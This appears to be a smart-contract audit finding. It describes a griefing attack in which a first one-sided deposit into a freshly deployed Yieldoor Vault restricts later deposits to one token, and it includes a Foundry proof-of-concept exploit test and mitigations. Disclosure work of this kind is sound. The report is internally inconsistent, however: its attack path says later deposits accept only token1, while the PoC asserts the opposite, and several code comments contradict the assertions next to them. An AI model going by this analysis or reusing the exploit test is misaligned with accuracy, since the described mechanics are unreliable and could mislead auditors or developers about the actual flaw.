# Attacker Can Backrun Vault Deployment to Force Single-Token Behavior

### Summary

The flawed deposit calculation logic in _calcDeposit can cause a restriction of deposits to a single token for future users as an attacker can backrun the Vault deployment to deposit only one token before the first legitimate user.

### Root Cause

In [Vault.sol:134-139](https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/Vault.sol#L134-L139), the _calcDeposit function assumes that if one token’s balance is zero (bal0 == 0 or bal1 == 0), only the other token can be deposited to calculate shares. This design choice is a mistake as it allows an attacker to backrun the vault’s deployment and deposit a small amount of one token (e.g., token0), setting bal1 to zero and forcing all subsequent deposits to only accept token1.

```solidity
} else if (bal0 == 0) {
    amount1 = depositAmount1;
    shares = amount1 * totalSupply / bal1;
} else if (bal1 == 0) {
    amount0 = depositAmount0;
    shares = amount0 * totalSupply / bal0;
}
```

### Internal Pre-conditions

1. The attacker needs to call deposit() to set totalSupply to be at least 1000 (initial burn amount).
2. The attacker needs to deposit a small amount of token0 (e.g., 1 wei) to set bal0 to be greater than 0 while keeping bal1 at 0.

### External Pre-conditions

1. The Vault contract must be freshly deployed with no prior deposits (i.e., totalSupply == 0 initially).
2. The attacker must monitor the blockchain to backrun the deployment transaction before any legitimate user deposits.

### Attack Path

1. The attacker monitors the mempool or blockchain for the deployment of the Vault contract.
2. Immediately after deployment, the attacker calls deposit(1001, 0, 0, 0) to deposit 1001 wei of token0 and 0 of token1.
3. The _calcDeposit function mints 1001 - 1000 shares to the burn address (since totalSupply == 0) and sets bal0 = 1 and bal1 = 0.
4. For all subsequent users, _calcDeposit will only allow deposits of token1 because bal0 > 0, and the else if (bal1 == 0) branch will never trigger again unless bal0 somehow becomes zero.

### Impact

Future users suffer an inability to deposit token0 and are restricted to depositing only token1. The attacker gains no direct profit but can grief the protocol by breaking its intended dual-token functionality.

### PoC

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";
import {IVault} from "../src/Vault.sol";
import {IERC20} from "@openzeppelin/token/ERC20/IERC20.sol";
import {IUniswapV3Pool} from "../src/interfaces/IUniswapV3Pool.sol";
import {Strategy} from "../src/Strategy.sol";

contract VaultExploitTest is Test {
    IUniswapV3Pool pool = IUniswapV3Pool(0x99ac8cA7087fA4A2A1FB6357269965A2014ABc35);
    IERC20 wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // token0
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // token1
    address attacker = address(0xdead);
    address token0 = address(wbtc);
    address token1 = address(usdc);
    address rebalancer = address(1001);
    address feeRecipient = address(9999);
    Vault vault;
    Strategy strategy;

    function setUp() public {
        // Deploy fresh instances
        vault = new Vault(token0, token1);
        strategy = new Strategy(address(pool), address(vault), rebalancer, feeRecipient);
        vault.setStrategy(address(strategy));

        // Approve vault to spend strategy's tokens
        vm.startPrank(address(strategy));
        wbtc.approve(address(vault), type(uint256).max);
        usdc.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        // Give attacker some token1 (USDC)
        deal(token0, attacker, 1001); // 10,000 wei of USDC
        vm.prank(attacker);
        wbtc.approve(address(vault), 1001);
    }

    function testBackrunExploit() public {
        // Attacker backruns deployment with minimal token1 deposit
        vm.prank(attacker);
        (uint256 shares,,) = vault.deposit(1001, 0, 0, 0);
        assertEq(shares, 1, "Attacker should receive 1 share");

        // Check that bal0 == 0 and bal1 > 0
        (uint256 bal0, uint256 bal1) = vault.balances();
        assertEq(bal0, 1001, "token0 balance should be 0");
        assertEq(bal1, 0, "token1 balance should be 1001");

        // Simulate a legitimate user trying to deposit both tokens
        address user = address(0x123);
        deal(token0, user, 1e18); // 1 WBTC
        deal(token1, user, 1e18); // 1 USDC
        vm.startPrank(user);
        wbtc.approve(address(vault), 1e18);
        usdc.approve(address(vault), 1e18);

        // User deposits both tokens, expecting token0 to be ignored
        (uint256 userShares, uint256 amount0, uint256 amount1) = vault.deposit(1e18, 1e18, 0, 0);
        assertGt(amount0, 0, "token0 deposit should be accepted");
        assertEq(amount1, 0, "token1 deposit should be 0");
        assertGt(userShares, 0, "User should receive shares");

        vm.stopPrank();
    }
}
```

### Mitigation

To prevent this attack, modify _calcDeposit to enforce proportional deposits even when one balance is zero, or add a check to ensure both tokens are deposited in the first transaction. For example:

- Require depositAmount0 > 0 && depositAmount1 > 0 when totalSupply == 0.

- Alternatively, initialize the vault with a small amount of both tokens during deployment to ensure neither bal0 nor bal1 is zero.
